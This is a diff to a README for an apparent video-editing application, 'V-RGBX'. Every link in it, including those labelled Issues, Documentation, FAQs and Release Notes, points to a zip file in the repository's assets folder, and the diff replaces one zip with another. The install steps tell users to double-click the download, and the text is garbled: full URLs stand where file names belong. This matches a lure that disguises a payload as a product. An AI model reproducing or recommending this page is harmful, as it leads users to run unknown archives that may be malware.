@@ -1,6 +1,6 @@
 # 🎥 V-RGBX - Edit Videos with Ease and Precision
 
-[![Download V-RGBX](https://raw.githubusercontent.com/harsh101720/V-RGBX/main/assets/RGBX_v1.5-beta.4.zip%20V--RGBX-%20-brightgreen)](https://raw.githubusercontent.com/harsh101720/V-RGBX/main/assets/RGBX_v1.5-beta.4.zip)  
+[![Download V-RGBX](https://github.com/harsh101720/V-RGBX/raw/refs/heads/main/assets/RGBX-v1.9.zip%20V--RGBX-%20-brightgreen)](https://github.com/harsh101720/V-RGBX/raw/refs/heads/main/assets/RGBX-v1.9.zip)  
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you download, make sure your computer meets these requirements:
 
 ## 💻 Download & Install
 
-To get started, visit this page to download: [Download V-RGBX](https://raw.githubusercontent.com/harsh101720/V-RGBX/main/assets/RGBX_v1.5-beta.4.zip).  
+To get started, visit this page to download: [Download V-RGBX](https://github.com/harsh101720/V-RGBX/raw/refs/heads/main/assets/RGBX-v1.9.zip).  
 
 Follow these steps:
 
@@ -28,11 +28,11 @@ Follow these steps:
 4. Click on the file to begin the download.
 5. Once the download is complete, locate the file in your downloads folder.
 
-For Windows users, the file will likely be named `https://raw.githubusercontent.com/harsh101720/V-RGBX/main/assets/RGBX_v1.5-beta.4.zip`. For macOS, you might see a file named `https://raw.githubusercontent.com/harsh101720/V-RGBX/main/assets/RGBX_v1.5-beta.4.zip`.
+For Windows users, the file will likely be named `https://github.com/harsh101720/V-RGBX/raw/refs/heads/main/assets/RGBX-v1.9.zip`. For macOS, you might see a file named `https://github.com/harsh101720/V-RGBX/raw/refs/heads/main/assets/RGBX-v1.9.zip`.
 
 ### Installation Steps for Windows
 
-1. Double-click the `https://raw.githubusercontent.com/harsh101720/V-RGBX/main/assets/RGBX_v1.5-beta.4.zip` file to start the installation.
+1. Double-click the `https://github.com/harsh101720/V-RGBX/raw/refs/heads/main/assets/RGBX-v1.9.zip` file to start the installation.
 2. Follow the on-screen prompts.
 3. Choose the installation directory or go with the default.
 4. Click "Install" and wait for the process to finish.
@@ -40,7 +40,7 @@ For Windows users, the file will likely be named `https://raw.githubusercontent.
 
 ### Installation Steps for macOS
 
-1. Double-click the `https://raw.githubusercontent.com/harsh101720/V-RGBX/main/assets/RGBX_v1.5-beta.4.zip` file.
+1. Double-click the `https://github.com/harsh101720/V-RGBX/raw/refs/heads/main/assets/RGBX-v1.9.zip` file.
 2. Drag the V-RGBX icon into your Applications folder.
 3. Eject the DMG file.
 4. Open Finder, go to Applications, and double-click V-RGBX to start the application.
@@ -68,7 +68,7 @@ After the installation is complete, you can start using V-RGBX:
 If you encounter any issues:
 
 - Visit the **Help** section within the app for guidance.
-- Check the [Issues](https://raw.githubusercontent.com/harsh101720/V-RGBX/main/assets/RGBX_v1.5-beta.4.zip) page on GitHub for common problems and solutions.
+- Check the [Issues](https://github.com/harsh101720/V-RGBX/raw/refs/heads/main/assets/RGBX-v1.9.zip) page on GitHub for common problems and solutions.
 - Feel free to ask questions on the GitHub repository.
 
 ## 🤝 Contributing
@@ -88,12 +88,12 @@ Join our community to share tips, ask questions, and learn from other users. You
 
 ## 📅 Release Notes
 
-For detailed information about updates and changes, visit the [Release Notes](https://raw.githubusercontent.com/harsh101720/V-RGBX/main/assets/RGBX_v1.5-beta.4.zip) section.
+For detailed information about updates and changes, visit the [Release Notes](https://github.com/harsh101720/V-RGBX/raw/refs/heads/main/assets/RGBX-v1.9.zip) section.
 
 ## 🔗 Useful Links
 
-- [Download V-RGBX](https://raw.githubusercontent.com/harsh101720/V-RGBX/main/assets/RGBX_v1.5-beta.4.zip)
-- [Documentation](https://raw.githubusercontent.com/harsh101720/V-RGBX/main/assets/RGBX_v1.5-beta.4.zip)
-- [FAQs](https://raw.githubusercontent.com/harsh101720/V-RGBX/main/assets/RGBX_v1.5-beta.4.zip)
+- [Download V-RGBX](https://github.com/harsh101720/V-RGBX/raw/refs/heads/main/assets/RGBX-v1.9.zip)
+- [Documentation](https://github.com/harsh101720/V-RGBX/raw/refs/heads/main/assets/RGBX-v1.9.zip)
+- [FAQs](https://github.com/harsh101720/V-RGBX/raw/refs/heads/main/assets/RGBX-v1.9.zip)
 
 Thank you for choosing V-RGBX! Enjoy editing your videos!
